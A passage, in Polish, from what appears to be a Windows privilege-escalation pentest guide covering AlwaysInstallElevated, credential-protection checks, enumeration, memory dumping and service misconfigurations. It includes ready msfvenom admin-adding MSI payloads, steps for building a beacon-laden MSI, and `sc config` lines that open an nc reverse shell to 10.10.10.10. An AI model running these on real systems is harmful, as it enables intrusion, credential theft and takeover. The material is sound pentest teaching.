Więcej informacji o przebiegu ataku znajdziesz w [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 rejestry są **włączone** (wartość to **0x1**), użytkownicy z dowolnym poziomem uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu plik binarny Windows MSI służący do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (wymagany jest więc dostęp GIU):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten samouczek, aby dowiedzieć się, jak utworzyć MSI wrapper przy użyciu tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **wiersze poleceń**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- Wygeneruj za pomocą Cobalt Strike lub Metasploit **nowy payload Windows EXE TCP** w lokalizacji `C:\privesc\beacon.exe`.
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizację użyj **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż przejdziesz do kroku 3 z 4 (wybór plików do dołączenia). Kliknij **Add** i wybierz wygenerowany przed chwilą payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w oknie **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić także inne właściwości, takie jak **Author** i **Manufacturer**, aby zainstalowana aplikacja wyglądała bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony natychmiast po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawiono platformę x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i detektory

### Ustawienia audytu

Te ustawienia określają, co jest **rejestrowane**, więc zwróć na nie uwagę

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** służy do **zarządzania hasłami lokalnego konta Administrator**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL, co pozwala im wyświetlać hasła lokalnego administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli ta funkcja jest aktywna, **hasła w postaci jawnego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Począwszy od **Windows 8.1**, firma Microsoft wprowadziła rozszerzoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** lub wstrzykiwania kodu przez niezaufane procesy, zwiększając tym samym bezpieczeństwo systemu.\
[**Więcej informacji o LSA Protection znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego zadaniem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Buforowane poświadczenia

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zwykle ustanawiane są poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o buforowanych poświadczeniach**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Wyliczanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Uprzywilejowane grupy

Jeśli **należysz do uprzywilejowanej grupy, możesz być w stanie eskalować uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Zapoznaj się z poniższą stroną, aby **dowiedzieć się więcej o interesujących tokenach** i o tym, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje

```bash
qwinsta
klist sessions
```

### Katalogi domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Zasady dotyczące haseł

```bash
net accounts
```

### Pobieranie zawartości schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, wyświetlając procesy, **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** lub czy masz uprawnienia do zapisu w folderze z plikiem binarnym, aby wykorzystać potencjalne [**ataki DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — można je wykorzystać do eskalacji uprawnień](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Listener debuggera może działać krótko, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż każdy zaobserwowany listener z jego PID-em, właścicielem procesu oraz możliwością uzyskania do niego dostępu przez użytkownika o niższych uprawnieniach. Sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości wykonania kodu z innego konta. Podczas rutynowej enumeracji ogranicz się do działań pasywnych i nie wysyłaj poleceń do debuggera.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów plików binarnych procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)** **

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocessorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź dokładnie tę konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token pozwala tworzyć tam pliki, ścieżka ta wymaga sprawdzenia pod kątem możliwości wykonania kodu przy następnym ładowaniu modułów przez to zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta, na którym uruchamiany jest proces, aktywną konfigurację, zgodność modułów oraz ewentualne ograniczenia odmowy dostępu lub udziału; sam katalog z prawem zapisu nie dowodzi eskalacji. [Dokumentacja dynamicznych preprocessorów Snort](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa WWW z katalogiem dokumentów z prawem zapisu

W instalacji Apache w systemie Windows porównaj ścieżkę pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W standardowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik z niższymi uprawnieniami może tworzyć pliki w tym katalogu, a Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że serwowane są pliki z dokładnie tej ścieżki oraz że pliki danego typu są obsługiwane przez mechanizm po stronie serwera; sam katalog z prawem zapisu dowodzi jedynie możliwości tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

For conventionalną instalację WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja może znajdować się obok niego w `conf\httpd.conf`, z domyślnym katalogiem głównym `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź dokładny obraz usługi, tożsamość, z którą jest uruchamiana, efektywną wartość `DocumentRoot` (w tym rozwinięcie `${INSTALL_DIR}` i nadpisania konfiguracji virtual hostów) oraz ACL katalogu głównego. Zapisywalny katalog WAMP nie oznacza, że Apache działa jako `SYSTEM` ani że uruchomi przesłany plik. [Apache opisuje, jak usługa systemu Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość sieciowa puli aplikacji

W przypadku IIS powiąż zapisywalny katalog fizyczny z **aktywną witryną/aplikacją** w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w katalogu udostępnianym przez serwer działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a trasa jest osiągalna. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan działania witryny, handler i nadpisania dla danej ścieżki.

Dynamiczna kompilacja ASP.NET to osobna ścieżka, którą warto sprawdzić: wygenerowane pliki w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może to zmienić. [Microsoft opisuje lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach może zmieniać wygenerowany kod źródłowy w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja rekompiluje go z użyciem bardziej uprzywilejowanej [tożsamości procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Same ACL pliku lub katalogu nie dowodzą możliwości wykonania kodu: zweryfikuj powiązanie pamięci podręcznej z aktywną aplikacją, efektywny token i ACL, ustawienia kompilacji, tożsamość procesu oraz moment ewentualnej rekompilacji. Korzystaj wyłącznie z przeglądu metadanych w trybie tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie zmieniaj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` zwykle uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zwykle przedstawia anonimowe poświadczenia sieciowe. Pula `SpecificUser` używa skonfigurowanego dla niej konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [tożsamość sieciową puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się w zależności od generacji IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli z tożsamością sieciową konta komputera, oceń uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam bilet konta komputera lub rola hosta nie potwierdzają ich posiadania. Pasywna enumeracja powinna obejmować sprawdzenie konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, deszyfrowanie, walidację i tworzenie polecenia. Handler, który konkatenacją dołącza zdekodowany token do `ProcessStartInfo("cmd", "/c ...")`, może pozwolić metaznakom powłoki na zmianę polecenia; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany klient może rzeczywiście wpływać na zdekodowaną wartość i uzyskać dostęp do handlera, a następnie określ efektywną tożsamość puli aplikacji lub tożsamość podszywaną oraz tożsamość procesu potomnego. Czytelna linia kodu źródłowego, listener na localhost ani słabość formatu tokenu same w sobie nie dowodzą możliwości wykonania uprzywilejowanego polecenia. Podczas pasywnej enumeracji sprawdź kod źródłowy i konfigurację puli, nie wysyłając sfałszowanych żądań ani nie uruchamiając procesu pomocniczego.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie zapisywalnego przez użytkownika o niższych uprawnieniach pliku PHP z tożsamością procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozstrzygnięta ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może zmodyfikować, a proces roboczy odczytać, obowiązujące ograniczenia ścieżek PHP zezwalają na dołączenie pliku oraz proces roboczy działa z wyższymi uprawnieniami. Listener loopback ani sam zapisywalny plik nie dowodzą istnienia tego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików, nie wywołując endpointu.

### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci uruchomionego procesu za pomocą **procdump** z pakietu sysinternals. Usługi takie jak FTP przechowują **poświadczenia w pamięci jawnym tekstem**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niezabezpieczone aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Pomoc i obsługa techniczna systemu Windows” (Windows + F1), wyszukaj „wiersz polecenia”, kliknij „Kliknij, aby otworzyć wiersz polecenia”

### Import plików projektu z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu podrzędnego zapisywalnego przez użytkownika o niższych uprawnieniach, przekracza granicę zaufania danych wejściowych w kontekście konta importującego. Sprawdź **dokładną ścieżkę z prawami zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem Ghidra z otwieraniem/przywracaniem projektu](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie z konta importującego, jeśli pozwalały na to [zasady dotyczące wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To trop związany z ujawnieniem poświadczeń, a nie natychmiastowym dostępem administratora: uzyskaną odpowiedź trzeba móc wykorzystać osobną, autoryzowaną lub podatną ścieżką, a aktualne wersje należy oceniać na podstawie ich rzeczywistego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) obiektu Service Control Manager (SCM) jest odrębne od praw dotyczących istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) do tego prawa jest tropem do sprawdzenia, a nie dowodem, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi wymaganymi podczas jej tworzenia; późniejsze ponowne otwarcie usługi powoduje osobne sprawdzenie dostępu i może się nie powieść, nawet jeśli można było użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi zestaw te prawa SCM z udziałem na hoście docelowym, na którym **to samo logowanie sieciowe** ma prawa zapisu, jego bazowymi ACL NTFS oraz lokalną ścieżką do pliku wykonywalnego, który konto usługi może uruchomić. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM oraz ścieżka umieszczania plików; udział administracyjny nie jest warunkiem koniecznym. Same prawa zapisu do udziału ani sam trop dotyczący możliwości utworzenia usługi w SCM nie dowodzą, że nową usługę można uruchomić z wyższymi uprawnieniami.

Istniejąca usługa może wywołać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego pliku nie ma w jej `ImagePath`. Jeśli nazwa pomocniczego pliku jest rozwiązywana do katalogu, w którym użytkownik o niższych uprawnieniach może zapisywać, a usługa działa z wyższymi uprawnieniami, brakujący plik pomocniczy może być warunkowym kandydatem do zastąpienia. Potwierdź **rzeczywisty kod usługi lub udokumentowane wywołanie pliku pomocniczego**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia katalogu, tożsamość usługi oraz dostępny mechanizm wyzwalający zdarzenie cyklu życia. Sam zapisywalny katalog usługi lub brak pliku nie dowodzi, że usługa go załaduje; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo do uruchamiania za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli używa argumentu wybranego przez wywołującego jako ścieżki dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis w chronionym katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje osobny uprzywilejowany mechanizm, który używa lub ładuje ten plik; sam zapisywalny dziennik lub prawo do uruchamiania nie wystarczą. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ plik `nsclient.ini`, który można odczytać, jest **tropem do sprawdzenia konfiguracji**: może zawierać dane uwierzytelniające do web, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź rzeczywiste konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Uprzywilejowane wykonanie wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonania), skutecznego prawa do rejestrowania lub modyfikowania polecenia oraz mechanizmu wyzwalającego jego uruchomienie w kontekście tożsamości usługi. Interfejs nasłuchujący wyłącznie na loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub interfejs nasłuchujący nie dowodzą istnienia tych praw. Podczas pasywnego rozpoznania sprawdzaj metadane i uprawnienia bez wyświetlania sekretów ani wywoływania web API. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wytyczne dotyczące zabezpieczania web i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź rzeczywiste konto, na którym działa usługa, oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), a `AppDirectory` to skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za całą granicę bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji potomnej oraz ACL jego katalogu nadrzędnego. Lokalny endpoint WCF lub SOAP udostępniany przez tę aplikację to odrębny trop do sprawdzenia: potwierdź, że użytkownik o niższych uprawnieniach może połączyć się z nasłuchującym endpointem, że dokładna operacja akceptuje jego dane wejściowe oraz że proces potomny usługi wykonuje niebezpieczną operację z wyższymi uprawnieniami. Samo konto usługi, URL endpointu ani zapisywalna ścieżka nie dowodzą możliwości eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź, jak kontrolowany przez wywołującego ciąg znaków trafia do runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania **konkretnej** operacji oraz efektywną tożsamość runspace należy sprawdzić osobno. Ścieżka od danych wejściowych użytkownika o niższych uprawnieniach do `AddScript` wykonywanego z tożsamością usługi o wyższych uprawnieniach wyznacza granicę wykonywania kodu; sam nasłuchujący port, uwierzytelniony klient lub niewykorzystywana metoda w niezwiązanym zestawie nie dowodzą podatności. Podczas rozpoznania sprawdź statycznie wdrożoną usługę, jej kontrakt, autoryzację i ustawienia impersonacji; nie wywołuj endpointu.

Wyzwalacze usług pozwalają systemowi Windows uruchomić usługę, gdy wystąpią określone warunki (aktywność nazwanego potoku/endpointu RPC, zdarzenia ETW, dostępność adresu IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi przez wywołanie ich wyzwalaczy. Techniki rozpoznania i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa zbierająca dane diagnostyczne Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. W ataku [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystano junction oraz wyścig związany z linkiem object managera, aby przekierować reset DACL usługi. Zademonstrowana eskalacja wymagała również dostępnej ścieżki naprawy MSI dostawcy WMI programu Visual Studio Setup oraz docelowego pliku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Ten komponent poprawiono w styczniu 2024 r.

Na potrzeby pasywnej wstępnej oceny sprawdź konto i ścieżkę pliku binarnego tej usługi, czy istnieje ścieżka kompilatora Setup WMI oraz stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio ani plik kompilatora nie dowodzą, że host jest podatny. Kontrola nie wymaga uruchamiania usługi ani wykonywania naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się użycie pliku binarnego **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąś usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Wystąpił błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma włączonych urządzeń z nią skojarzonych._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Weź pod uwagę, że usługa upnphost wymaga do działania usługi SSDPSRV (w przypadku XP SP1)**

**Innym sposobem obejścia** tego problemu jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować jej plik wykonywalny. Aby zmodyfikować i uruchomić **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Uruchom ponownie usługę

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę konfiguracji uprawnień, co pozwala zmieniać konfigurację usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i zmianę konfiguracji uprawnień.
- **GENERIC_WRITE**: Daje również możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Także daje możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystywania tej podatności można użyć modułu _exploit/windows/local/service_permissions_.

### Słabe uprawnienia plików binarnych usług

